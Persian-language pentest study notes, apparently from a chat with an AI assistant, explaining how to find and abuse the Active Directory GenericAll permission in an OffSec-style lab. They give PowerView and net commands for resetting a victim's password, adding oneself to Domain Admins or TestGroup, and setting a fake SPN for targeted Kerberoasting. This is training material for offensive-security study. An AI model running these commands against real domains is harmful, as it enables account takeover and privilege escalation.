
خوبه، GenericAll یکی از خطرناک‌ترین permission ها در AD هستش.

**GenericAll چیه؟**
دسترسی کامل به یه آبجکت - یعنی می‌تونی هر کاری روش انجام بدی (تغییر پسورد، اضافه کردن به گروه، تغییر ACL و...)

نه، برعکسه.

یوزر فعلی تو (یا گروهی که توش هستی) روی یه شیء دیگه دسترسی کامل داره.

**مثال:**
```powershell
Get-ObjectACL -Identity targetuser -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll"}
```

اگه خروجی نشون بده که `stephanie` روی `targetuser` دسترسی GenericAll داره:
- **stephanie** = یوزر فعلی تو (مهاجم)
- **targetuser** = قربانی که تو می‌تونی روش کار کنی

**پس تو می‌تونی:**
- پسورد `targetuser` رو عوض کنی
- SPN بهش اضافه کنی و Kerberoast کنی
- اگه گروهه، خودت رو بهش اضافه کنی

**جریان:**
تو با یوزر `stephanie` لاگین کردی → چک می‌کنی `stephanie` روی چی دسترسی GenericAll داره → اون شیء رو abuse می‌کنی.

واضح شد؟
![[Pasted image 20260428121132.png]]


**سناریوهای معمول Abuse:**

**1. روی User Object:**
```powershell
net user targetuser NewPass123! /domain
```
یا با PowerView:
```powershell
Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
```

**2. روی Group Object:**
```powershell
# اضافه کردن خودت به گروه
net group "Domain Admins" currentuser /add /domain
```
یا:
```powershell
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'currentuser'
```

**3. روی Computer Object:**
- Resource-Based Constrained Delegation (RBCD) attack
- Shadow Credentials attack

**4. Targeted Kerberoasting:**
```powershell
# اضافه کردن SPN به یوزر
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/service'}
# حالا می‌تونی Kerberoast کنی
```



خب، بریم تحلیل کنیم:

**چی داریم:**
- **ObjectDN**: `CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com` → این یه **گروه** هست
- **ActiveDirectoryRights**: `GenericAll` → دسترسی کامل
- **Identity**: `PROD\offsec` → یوزر `offsec` روی این گروه GenericAll داره

**یعنی چی:**
یوزر فعلی تو (`offsec`) می‌تونه روی گروه `TestGroup` هر کاری بخواد انجام بده.

**حالا چیکار می‌تونی بکنی:**
خودت رو به گروه `TestGroup` اضافه کنی:

```powershell
Add-DomainGroupMember -Identity 'TestGroup' -Members 'offsec'
```

یا با `net`:
```powershell
net group TestGroup offsec /add /domain
```

**چک کن:**
```powershell
Get-DomainGroupMember -Identity TestGroup
```

**چرا مهمه:**
اگه `TestGroup` دسترسی‌های خاصی داشته باشه (مثلاً روی سرورها، شیرها، یا گروه‌های دیگه)، تو الان اون دسترسی‌ها رو داری.

